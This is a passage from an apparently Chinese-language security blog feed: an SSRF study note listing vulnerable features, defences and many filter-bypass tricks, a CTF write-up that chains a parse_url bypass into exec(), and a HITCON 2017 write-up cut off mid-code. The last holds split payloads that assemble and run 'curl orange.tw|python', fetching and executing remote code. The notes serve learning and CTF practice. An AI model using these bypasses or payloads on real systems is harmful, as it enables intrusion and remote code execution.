漏洞常见的出现场景</h2><p>直接先上某大佬的一张脑图和大佬们的总结，感觉总结的已经很完整了，就不班门弄斧了，还得多实践。总结一句话就是一切需要有url的地方都可能存在</p><blockquote><ol><li>社交分享功能：获取超链接的标题等内容进行显示</li><li>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</li><li>在线翻译：给网址翻译对应网页的内容</li><li>图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</li><li>图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</li><li>云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</li><li>网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</li><li>数据库内置功能：数据库的比如mongodb的copyDatabase函数</li><li>邮件系统：比如接收邮件服务器地址</li><li>编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</li><li>未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞<br>一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</li><li>从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</li></ol></blockquote><h2 id="0x07-漏洞防御"><a href="#0x07-漏洞防御" class="headerlink" title="0x07 漏洞防御"></a>0x07 漏洞防御</h2><ol><li>协议禁用，只允许http和https</li><li>黑名单过滤，禁止访问内网ip</li><li>端口限制</li><li>白名单，设置只可访问的url</li><li>禁止跳转，防止利用url跳转进行绕过</li><li>感觉也可以做一些符号过滤如@</li></ol><p>这是我能想到的，看其他师傅们还有两种方法<br>一种是对过滤返回信息，还有就是统一错误信息<br>第一种是在把返回结果给用户之前进行一次检验，后一种则是防止用户可以根据错误信息来判断远端服务器的端口状态</p><h2 id="0x08-bypass姿势"><a href="#0x08-bypass姿势" class="headerlink" title="0x08 bypass姿势"></a>0x08 bypass姿势</h2><p>通过上面的防御方式，其实也能看出来一下bypass的姿势</p><h3 id="8-1绕过姿势"><a href="#8-1绕过姿势" class="headerlink" title="8.1绕过姿势"></a>8.1绕过姿势</h3><h4 id="8-1-1-特殊地址"><a href="#8-1-1-特殊地址" class="headerlink" title="8.1.1 特殊地址"></a>8.1.1 特殊地址</h4><ol><li>[::]<br>利用的应该是ipv6，windows本机测试失败，linux服务器可能是网卡问题提示网络问题，应该在linuz服务器上是可以用的</li><li><a href="http://0/" target="_blank" rel="noopener">http://0/</a><br>等同于127.0.0.1，windows失败，linux成功<h4 id="8-1-2-、-字符绕过"><a href="#8-1-2-、-字符绕过" class="headerlink" title="8.1.2 @、#字符绕过"></a>8.1.2 @、#字符绕过</h4>下面会有详细介绍<h4 id="8-1-3-利用Enclosed-alphanumerics（封闭式字符数字）绕过"><a href="#8-1-3-利用Enclosed-alphanumerics（封闭式字符数字）绕过" class="headerlink" title="8.1.3 利用Enclosed alphanumerics（封闭式字符数字）绕过"></a>8.1.3 利用Enclosed alphanumerics（封闭式字符数字）绕过</h4>应该时编码的问题，同样windows失败，linux成功<pre><code>ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.comList:① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</code></pre><h4 id="8-1-4-句号绕过"><a href="#8-1-4-句号绕过" class="headerlink" title="8.1.4 句号绕过"></a>8.1.4 句号绕过</h4>windows失败，linux成功</li></ol><p><code>127。0。0。1  &gt;&gt;&gt;  127.0.0.1</code></p><h4 id="8-1-5-短地址绕过"><a href="#8-1-5-短地址绕过" class="headerlink" title="8.1.5 短地址绕过"></a>8.1.5 短地址绕过</h4><p>可以利用短地址绕过一些限制</p><h4 id="8-1-6-利用特殊DNS解析绕过"><a href="#8-1-6-利用特殊DNS解析绕过" class="headerlink" title="8.1.6 利用特殊DNS解析绕过"></a>8.1.6 利用特殊DNS解析绕过</h4><p>.xip.io这个解析服务器会把IP地址+.xio.io全返回到IP地址，无论前面有多少级子域名</p><pre><code>          10.0.0.1.xip.io   resolves to   10.0.0.1      www.10.0.0.1.xip.io   resolves to   10.0.0.1   mysite.10.0.0.1.xip.io   resolves to   10.0.0.1  foo.bar.10.0.0.1.xip.io   resolves to   10.0.0.1</code></pre><h4 id="8-1-7-进制转换绕过"><a href="#8-1-7-进制转换绕过" class="headerlink" title="8.1.7 进制转换绕过"></a>8.1.7 进制转换绕过</h4><p>我们访问域名实际上是访问域名所对应的ip地址，这些ip地址⼀般都是点分⼗进制，我们可以将其转化为⼗进制整数或者⼗六进制或者⼋进制点分和十六进制点分。转换脚本如下：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">ip2decimalism</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">:</span>     dec_value <span class="token operator">=</span> <span class="token number">0</span>     v_list<span class="token operator">=</span>ip<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span>             v_list<span class="token punctuation">.</span>reverse<span class="token punctuation">(</span><span class="token punctuation">)</span>             t<span class="token operator">=</span><span class="token number">1</span>            <span class="token keyword">for</span> v <span class="token keyword">in</span> v_list<span class="token punctuation">:</span>                    dec_value <span class="token operator">+=</span> int<span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">*</span> t                    t <span class="token operator">=</span> t <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">**</span> <span class="token number">8</span><span class="token punctuation">)</span>           <span class="token keyword">return</span> dec_value<span class="token keyword">def</span> <span class="token function">ip2hex</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">:</span>            ip_list<span class="token operator">=</span>ip<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span>            hex_ip<span class="token operator">=</span><span class="token string">"0x"</span>            <span class="token keyword">for</span> ip_num <span class="token keyword">in</span> ip_list<span class="token punctuation">:</span>                    hex_data<span class="token operator">=</span>hex<span class="token punctuation">(</span>int<span class="token punctuation">(</span>ip_num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>hex_data<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                            hex_ip<span class="token operator">=</span>hex_ip<span class="token operator">+</span><span class="token string">"0"</span><span class="token operator">+</span>hex_data                    <span class="token keyword">else</span><span class="token punctuation">:</span>                            hex_ip<span class="token operator">=</span>hex_ip<span class="token operator">+</span>hex_data             <span class="token keyword">return</span> hex_ip<span class="token keyword">def</span> <span class="token function">ip2oct</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">:</span>            ip_list<span class="token operator">=</span>ip<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span>            oct_ip<span class="token operator">=</span><span class="token string">''</span>            <span class="token keyword">for</span> ip_num <span class="token keyword">in</span> ip_list<span class="token punctuation">:</span>                    oct_data<span class="token operator">=</span><span class="token string">"0"</span><span class="token operator">+</span>oct<span class="token punctuation">(</span>int<span class="token punctuation">(</span>ip_num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>                    oct_ip<span class="token operator">+=</span>oct_data<span class="token operator">+</span><span class="token string">"."</span>            <span class="token keyword">return</span> oct_ip<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    ip<span class="token operator">=</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hex ip is: "</span><span class="token operator">+</span>str<span class="token punctuation">(</span>ip2hex<span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"int ip is: "</span><span class="token operator">+</span>str<span class="token punctuation">(</span>ip2decimalism<span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"oct ip is: "</span><span class="token operator">+</span>str<span class="token punctuation">(</span>ip2oct<span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h4 id="8-1-8-利用非http协议绕过"><a href="#8-1-8-利用非http协议绕过" class="headerlink" title="8.1.8 利用非http协议绕过"></a>8.1.8 利用非http协议绕过</h4><p>如果服务器端程序对访问URL所采用的协议进行验证的话，可以通过非HTTP协议来进行利用。</p><h4 id="8-1-9-利用302跳转绕过"><a href="#8-1-9-利用302跳转绕过" class="headerlink" title="8.1.9 利用302跳转绕过"></a>8.1.9 利用302跳转绕过</h4><p>需要一个vps，把302转换的代码部署到vps上，然后去访问，就可跳转到内网中。<br>demo:</p><pre><code>&lt;?php  $url = $_GET[&#39;u&#39;];header(&quot;Location: $url&quot;); </code></pre><h4 id="8-1-10-DNS-Rebinding绕过"><a href="#8-1-10-DNS-Rebinding绕过" class="headerlink" title="8.1.10 DNS Rebinding绕过"></a>8.1.10 DNS Rebinding绕过</h4><blockquote><p>在网页浏览过程中，用户在地址栏中输入包含域名的网址。浏览器通过DNS服务器将域名解析为IP地址，然后向对应的IP地址请求资源，最后展现给用户。而对于域名所有者，他可以设置域名所对应的IP地址。当用户第一次访问，解析域名获取一个IP地址；然后，域名持有者修改对应的IP地址；用户再次请求该域名，就会获取一个新的IP地址。对于浏览器来说，整个过程访问的都是同一域名，所以认为是安全的。这就造成了DNS Rebinding攻击。</p></blockquote><p>看这个图：<br><img src="https://img-blog.csdnimg.cn/20191011171513668.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5MTAxMDQ5,size_16,color_FFFFFF,t_70" alt><br>从图中可以看出来请求的流程：</p><ol><li>当用户请求一个url时，会先向获取一个host</li><li>对host进行DNS解析,返回一个IP(此时的DNS服务器可能是本地,也可能是其他的)</li><li>判断IP是否合法</li><li>合法的话会再去进行一次DNS解析</li></ol><p>首要条件就是要TTL为0,即DNS记录在DNS服务器上缓存时间为0,等于无缓存.这样我们只需要设置两个解析,其中一个为内网地址,就可能会绕过内网的限制,但是有点拼几率.还有一种方式是通过ns记录解析到一个子域名,然后再把子域名解析到内网ip,这样的话就能直接到内网.</p><h3 id="8-2-具体场景的绕过"><a href="#8-2-具体场景的绕过" class="headerlink" title="8.2 具体场景的绕过"></a>8.2 具体场景的绕过</h3><h4 id="8-2-1-限制为http-www-xxx-com-域名时"><a href="#8-2-1-限制为http-www-xxx-com-域名时" class="headerlink" title="8.2.1 限制为http://www.xxx.com 域名时"></a>8.2.1 限制为<a href="http://www.xxx.com" target="_blank" rel="noopener">http://www.xxx.com</a> 域名时</h4><p>先放一张图 url的组成<br><img src="https://legoc.github.io/2018/09/08/SSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/1.jpg" alt></p><p>通过可以看到一般URL会通过@来区分用户名和域名，这样我们就可以通过@来绕过域名的限制，不同的处理函数处理机制是不一样的，parse_url中获取的host是最后一个@符号后面的host，而libcurl则是获取的第一个@符号之后的</p><p>基于parse_url也可利用#等字符绕过，# 会阻断把前面的当成host</p><p>再就是filter_var的限定，可以用data://绕过，主要是因为filter_var()函数对于<a href="http://evil.com;google.com" target="_blank" rel="noopener">http://evil.com;google.com</a> 会返回false也就是认为url格式错误，但是对于0://evil.com:80;google.com:80/ 、0://evil.com:80,google.com:80/、0://evil.com:80\google.com:80/却返回true</p><h3 id="8-2-2-限制请求IP不为内网地址"><a href="#8-2-2-限制请求IP不为内网地址" class="headerlink" title="8.2.2 限制请求IP不为内网地址"></a>8.2.2 限制请求IP不为内网地址</h3><ol><li>短网址绕过</li><li>使用可以指向任意域名的xip.io，127.0.0.1.xip.io，可以解析为127.0.0.1</li><li>进制转换，127.0.0.1八进制：0177.0.0.1。十六进制：0x7f.0.0.1。十进制：2130706433</li></ol><h3 id="8-2-3限制请求只为http协议"><a href="#8-2-3限制请求只为http协议" class="headerlink" title="8.2.3限制请求只为http协议"></a>8.2.3限制请求只为http协议</h3><ol><li>url跳转</li><li>短地址</li></ol><h2 id="0x09-PS-思维导图"><a href="#0x09-PS-思维导图" class="headerlink" title="0x09 PS:思维导图"></a>0x09 PS:思维导图</h2><p><img src="https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200401192351.png" alt></p><p>PS:Gopher协议的文章写好了，感兴趣的师傅可以看看，算是这篇文章的延申</p><h2 id="0x10-参考文章"><a href="#0x10-参考文章" class="headerlink" title="0x10 参考文章"></a>0x10 参考文章</h2><p><a href="https://xz.aliyun.com/t/2115" target="_blank" rel="noopener">了解SSRF,这一篇就足够了</a><br><a href="https://zhengbao.wang/SSRF%E7%9A%84%E4%B8%80%E4%BA%9B%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF/" target="_blank" rel="noopener">SSRF的一些利用姿势</a><br><a href="https://xz.aliyun.com/t/6373" target="_blank" rel="noopener">https://xz.aliyun.com/t/6373</a><br><a href="https://www.secpulse.com/archives/65832.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/65832.html</a><br><a href="https://blog.csdn.net/qq_39101049/article/details/102501839s" target="_blank" rel="noopener">https://blog.csdn.net/qq_39101049/article/details/102501839s</a><br><a href="https://zhuanlan.zhihu.com/p/89426041" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/89426041</a></p><hr><p>版权声明：</p><p>除非注明，本博文章均为原创，转载请以链接形式标明本文地址。</p><hr>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一道CTF的trick分析</title>
      <link href="/4215173263.html"/>
      <url>/4215173263.html</url>
      
        <content type="html"><![CDATA[<h2 id="题目代码"><a href="#题目代码" class="headerlink" title="题目代码"></a>题目代码</h2><p>代码如下：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token constant">FILTER_VALIDATE_URL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/(data:\/\/)|(&amp;)|(\|)|(\.\/)/i'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"you are hacker"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/127\.0\.0\.1$/'</span><span class="token punctuation">,</span> <span class="token variable">$res</span><span class="token punctuation">[</span><span class="token string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span><span class="token string">'nononono'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span><span class="token string">'nonono!'</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="filter-var"><a href="#filter-var" class="headerlink" title="filter_var()"></a>filter_var()</h2><p>首先看filter_var()函数的官方说明<br><img src="https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200314224534.png" alt></p><blockquote><p>FILTER_VALIDATE_URL 过滤器把值作为 URL 来验证。<br>Name: “validate_url”<br>ID-number: 273<br>可能的标志：<br>FILTER_FLAG_SCHEME_REQUIRED - 要求 URL 是 RFC 兼容 URL（比如 <a href="http://example）" target="_blank" rel="noopener">http://example）</a><br>FILTER_FLAG_HOST_REQUIRED - 要求 URL 包含主机名（比如 <a href="http://www.example.com）" target="_blank" rel="noopener">http://www.example.com）</a><br>FILTER_FLAG_PATH_REQUIRED - 要求 URL 在域名后存在路径（比如 <a href="http://www.example.com/example1/test2/）" target="_blank" rel="noopener">www.example.com/example1/test2/）</a><br>FILTER_FLAG_QUERY_REQUIRED - 要求 URL 存在查询字符串（比如 “example.php?name=Peter&amp;age=37”）</p></blockquote><h2 id="parse-url"><a href="#parse-url" class="headerlink" title="parse_url()"></a>parse_url()</h2><p>先看官方手册<br><img src="https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200314231824.png" alt><br><img src="https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200314231939.png" alt><br><img src="https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200314232031.png" alt><br>对于parse_url()的拆分，是有解析漏洞的，根据特定符号进行分段例如通过@分割 user 与 host<br>这样就可以伪造host<br><img src="https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200314232827.png" alt></p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>首先我们要post一个url，而且host是以127.0.0.1结尾，有一个题目，是要以baidu.com结尾，这就衍生了另外的思路：买域名，或者post.baidu.com跳转<br>正常情况下，利用parse_url()的解析漏洞，其实就可以绕过了，但是在后面有<code>file_get_contens</code>的情况下，我们需要传入数据让<code>file_get_contens</code>读取，因为php对于MIME不敏感，我们可以修改text来利用data://来绕过，如：<code>data://baidu.com/plain;base64,xxxxx</code>，but,data://被ban了，看了大佬们的WP，发现可以利用<code>compress.zlib://data:@127.0.0.1/palin,让file_get_contens读取的代码</code>来绕过，<br><img src="https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200314235825.png" alt></p><p>为什么要用<code>compress.zlib://</code>没怎么弄懂，希望知道的大佬们指点一波，我分析的应该是compress.zlib://将后面的当成了要读取的文件（具体伪协议会另写一篇文章），并且根据官方手册说明</p><blockquote><p>compress.zlib://、 compress.bzip2:// 和 gzopen()、bzopen() 是相等的<br>尝试换成 compress.bzip2://试了一下，但是不知道为什么返回的全是空白（同求大佬指点）</p></blockquote><h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>这道题目大概就这些知识点和trick<br>下面再附上以为师傅的关于file_get_contens获取数据的总结截图<br><img src="https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200314235620.png" alt></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.jianshu.com/p/80ce73919edb" target="_blank" rel="noopener">【SSRF】如何绕过filter_var(), preg_match() 和 parse_url()</a><br><a href="https://blog.dyboy.cn/websecurity/154.html#title-3" target="_blank" rel="noopener">一道CTF题目的探究</a></p><hr><p>版权声明：</p><p>除非注明，本博文章均为原创，转载请以链接形式标明本文地址。</p><hr>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行绕过</title>
      <link href="/1877436815.html"/>
      <url>/1877436815.html</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-HITCON-2017-babyfirst-revenge"><a href="#0x01-HITCON-2017-babyfirst-revenge" class="headerlink" title="0x01 HITCON 2017 babyfirst-revenge"></a>0x01 HITCON 2017 babyfirst-revenge</h2><p>最近比遇到一个关于四字符getshell的问题，就把这道题目拿过来分析一下<br>v1代码：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token string">'/www/sandbox/'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">"orange"</span> <span class="token punctuation">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        @<span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'reset'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        @<span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">'/bin/rm -rf '</span> <span class="token punctuation">.</span> <span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>看代码是需要5个字符去绕过然后执行命令，关于linux命令限制突破，在P神的<a href="https://www.leavesongs.com/SHARE/some-tricks-from-my-secret-group.html" target="_blank" rel="noopener">《小密圈里的那些奇技淫巧》</a>早就有提到过，通过拆分来getshell<br>知识点：</p><ol><li>网络上下载文件的命令：curl、GET、wget</li><li><strong>linux可以利用<code>\</code>换行续写</strong></li><li>linux<code>&gt;</code>重定向,<code>&gt;</code>覆盖原有内容<code>&gt;&gt;</code>追加内容</li><li><strong>文件中的命令错误不影响之后命令的执行</strong></li><li>还有就是<code>ls</code>的<strong>排序问题</strong>，默认的排序方式显示符号再是数字，最后按字母顺序【注意，字母是<code>aAbB</code>这种顺序，即字母序】，而<code>ls -t</code>又超出长度限制，这就导致不得不考虑排序问题<br><img src="https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200313000138.png" alt></li></ol><p>这样的话题目思路就很清晰了，通过拆分通过拆分payload写入文件来执行远程VPS上的文件</p><p>目前拆分思路：</p><ol><li>先将<code>ls -t</code>写进一个文件，再按照时间顺序来写入payload，最后分别执行两个文件【官方payload】如下：</li></ol><pre class=" language-python"><code class="language-python">payload <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token comment" spellcheck="true"># generate `ls -t>g` file</span>    <span class="token string">'>ls\\'</span><span class="token punctuation">,</span>     <span class="token string">'ls>_'</span><span class="token punctuation">,</span>     <span class="token string">'>\ \\'</span><span class="token punctuation">,</span>     <span class="token string">'>-t\\'</span><span class="token punctuation">,</span>     <span class="token string">'>\>g'</span><span class="token punctuation">,</span>     <span class="token string">'ls>>_'</span><span class="token punctuation">,</span>     <span class="token comment" spellcheck="true"># generate `curl orange.tw|python`</span>    <span class="token string">'>on'</span><span class="token punctuation">,</span>     <span class="token string">'>th\\'</span><span class="token punctuation">,</span>     <span class="token string">'>py\\'</span><span class="token punctuation">,</span>     <span class="token string">'>\|\\'</span><span class="token punctuation">,</span>     <span class="token string">'>tw\\'</span><span class="token punctuation">,</span>    <span class="token string">'>e.\\'</span><span class="token punctuation">,</span>     <span class="token string">'>ng\\'</span><span class="token punctuation">,</span>     <span class="token string">'>ra\\'</span><span class="token punctuation">,</span>     <span class="token string">'>o\\'</span><span class="token punctuation">,</span>     <span class="token string">'>\ \\'</span><span class="token punctuation">,</span>     <span class="token string">'>rl\\'</span><span class="token punctuation">,</span>     <span class="token string">'>cu\\'</span><span class="token punctuation">,</span>     <span class="token comment" spellcheck="true"># exec</span>    <span class="token string">'sh _'</span><span class="token punctuation">,</span>     <span class="token string">'sh g'</span><span class="token punctuation">,</span> <span class="token punctuation">]</span></code></pre><ol start="2"><li><p>直接按照顺序写，当遇到后面的优先级比前面的大的时候可以先将前面的命令写入文件，再利用<code>rm</code>命令删除，最后的时候再利用<code>&gt;&gt;</code>来追加【其实第一种也要用到这个思路】<br>【例子如下，取自<a href="https://findneo.github.io/171110Bypass4CLimit/" target="_blank" rel="noopener">payload</a>】</p><pre class=" language-python"><code class="language-python">build <span class="token operator">=</span> <span class="token punctuation">[</span>'<span class="token operator">></span>cur\'<span class="token punctuation">,</span>      '<span class="token operator">></span>l \'<span class="token punctuation">,</span>      <span class="token string">'ls>A'</span><span class="token punctuation">,</span>      <span class="token string">'rm c*'</span><span class="token punctuation">,</span>      <span class="token string">'rm l*'</span><span class="token punctuation">,</span>      '<span class="token operator">></span><span class="token number">105</span>\'<span class="token punctuation">,</span>      '<span class="token operator">></span><span class="token number">304</span>\'<span class="token punctuation">,</span>      '<span class="token operator">></span><span class="token number">301</span>\'<span class="token punctuation">,</span>      '<span class="token operator">></span><span class="token number">9</span><span class="token operator">></span>\'<span class="token punctuation">,</span>      <span class="token string">'ls>>A'</span><span class="token punctuation">,</span>      <span class="token string">'sh A'</span><span class="token punctuation">,</span>      <span class="token string">'php A'</span>      <span class="token punctuation">]</span></code></pre><p>V1到这就没什么好说的了，再看V2：<br>代码：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token string">'/www/sandbox/'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">"orange"</span> <span class="token punctuation">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> @<span class="token function">mkdir</span><span class="token 